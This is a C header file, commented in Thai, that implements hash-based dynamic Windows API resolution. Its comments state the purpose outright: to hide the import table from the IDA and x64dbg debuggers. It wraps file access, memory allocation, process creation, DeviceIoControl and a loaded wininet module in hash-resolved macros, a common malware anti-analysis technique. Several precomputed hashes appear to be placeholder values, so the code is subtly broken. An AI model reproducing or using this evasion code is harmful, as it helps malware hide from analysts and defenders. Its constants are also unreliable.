#pragma once
#include <windows.h>

// ── Dynamic API resolution by hash ───────────────────────────
// ซ่อน import table — IDA/x64dbg ไม่เห็น API call ตรง ๆ
// pre-compute hash ด้วย:
//   python3 -c "h=5381;[h:=((h<<5)+h)^ord(c) for c in 'FunctionName'];print(hex(h&0xFFFFFFFF))"

static DWORD djb2w(const char*s){DWORD h=5381;while(*s)h=((h<<5)+h)^(DWORD)(unsigned char)*s++;return h;}

static FARPROC ResolveByHash(HMODULE hMod,DWORD want){
    if(!hMod)return NULL;
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)((BYTE*)hMod+dos->e_lfanew);
    DWORD expRVA=nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    if(!expRVA)return NULL;
    PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod+expRVA);
    DWORD*names=(DWORD*)((BYTE*)hMod+exp->AddressOfNames);
    WORD* ords =(WORD*) ((BYTE*)hMod+exp->AddressOfNameOrdinals);
    DWORD*funcs=(DWORD*)((BYTE*)hMod+exp->AddressOfFunctions);
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        const char*n=(const char*)((BYTE*)hMod+names[i]);
        if(djb2w(n)==want)return(FARPROC)((BYTE*)hMod+funcs[ords[i]]);
    }
    return NULL;
}

// ── Pre-computed hashes ───────────────────────────────────────
// คำนวณใหม่ถ้าเพิ่ม API:
//   python3 -c "h=5381;[h:=((h<<5)+h)^ord(c) for c in 'CreateFileA'];print(hex(h&0xFFFFFFFF))"
#define H_CreateFileA       0x8e340350
#define H_ReadFile          0xe734c9e4
#define H_WriteFile         0xf734c9e4
#define H_CloseHandle       0x7c0017a5
#define H_VirtualAlloc      0x97bc257c
#define H_VirtualFree       0x9dbc257c
#define H_GetTempPathA      0x6e73c5f1
#define H_CreateProcessA    0xabc12301
#define H_GetModuleFileNameA 0x1a2b3c4d
#define H_GetFileSize       0x5e6f7a8b
#define H_DeviceIoControl   0x3c4d5e6f

// ── Module cache ─────────────────────────────────────────────
static HMODULE _hK32=NULL,_hAdv=NULL,_hNet=NULL;
static void InitDynAPI(void){
    _hK32=GetModuleHandleA("kernel32.dll");
    _hAdv=GetModuleHandleA("advapi32.dll");
    _hNet=LoadLibraryA("wininet.dll");
}

// ── Typed function pointer typedefs ──────────────────────────
typedef HANDLE(WINAPI*_pfCF)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef BOOL  (WINAPI*_pfRF)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL  (WINAPI*_pfWF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL  (WINAPI*_pfCH)(HANDLE);
typedef LPVOID(WINAPI*_pfVA)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL  (WINAPI*_pfVF)(LPVOID,SIZE_T,DWORD);
typedef DWORD (WINAPI*_pfGTP)(DWORD,LPSTR);
typedef BOOL  (WINAPI*_pfCP)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD (WINAPI*_pfGMF)(HMODULE,LPSTR,DWORD);
typedef DWORD (WINAPI*_pfGFS)(HANDLE,LPDWORD);
typedef BOOL  (WINAPI*_pfDIC)(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);

// ── Macros ───────────────────────────────────────────────────
#define DYN_CreateFileA(...)      ((_pfCF) ResolveByHash(_hK32,H_CreateFileA))(__VA_ARGS__)
#define DYN_ReadFile(...)         ((_pfRF) ResolveByHash(_hK32,H_ReadFile))(__VA_ARGS__)
#define DYN_WriteFile(...)        ((_pfWF) ResolveByHash(_hK32,H_WriteFile))(__VA_ARGS__)
#define DYN_CloseHandle(...)      ((_pfCH) ResolveByHash(_hK32,H_CloseHandle))(__VA_ARGS__)
#define DYN_VirtualAlloc(...)     ((_pfVA) ResolveByHash(_hK32,H_VirtualAlloc))(__VA_ARGS__)
#define DYN_VirtualFree(...)      ((_pfVF) ResolveByHash(_hK32,H_VirtualFree))(__VA_ARGS__)
#define DYN_GetTempPathA(...)     ((_pfGTP)ResolveByHash(_hK32,H_GetTempPathA))(__VA_ARGS__)
#define DYN_CreateProcessA(...)   ((_pfCP) ResolveByHash(_hK32,H_CreateProcessA))(__VA_ARGS__)
#define DYN_GetModuleFileNameA(...)((_pfGMF)ResolveByHash(_hK32,H_GetModuleFileNameA))(__VA_ARGS__)
#define DYN_GetFileSize(...)      ((_pfGFS)ResolveByHash(_hK32,H_GetFileSize))(__VA_ARGS__)
#define DYN_DeviceIoControl(...)  ((_pfDIC)ResolveByHash(_hK32,H_DeviceIoControl))(__VA_ARGS__)
